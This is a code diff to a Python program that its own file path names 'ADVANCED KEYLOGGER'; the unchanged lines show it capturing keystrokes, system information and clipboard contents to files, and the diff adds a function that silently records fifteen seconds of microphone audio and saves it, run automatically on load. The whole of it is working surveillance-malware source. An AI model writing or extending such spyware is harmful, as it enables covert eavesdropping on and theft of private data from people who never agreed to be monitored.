@@ -34,6 +34,9 @@ from PIL import ImageGrab
 keys_info = "key_log.txt"
 system_info = "sys_info.txt"
 clipboard_info = "clipboard.txt"
+audio_info = "audio_recording.wav"
+microphone_time = 15
+
 file_path = "C:\\Users\\MSI PC\\Desktop\\ADVANCED KEYLOGGER\\project"
 extend = "\\"
 
@@ -102,3 +105,18 @@ def copy_clipboard():
             f.write("Could not read clipboard: " + str(e))
         
 copy_clipboard()
+
+def record_audio():
+    fs = 44100  
+    seconds = microphone_time 
+
+    try:
+        print("Recording audio...")
+        recorded_audio = sd.rec(int(seconds * fs), samplerate=fs, channels=2, dtype='int16')
+        sd.wait()  
+        write(file_path + extend + "audio_recording.wav", fs, recorded_audio)  
+        print("Audio recording saved.")
+    except Exception as e:
+        print("Error recording audio:", str(e))
+
+record_audio()
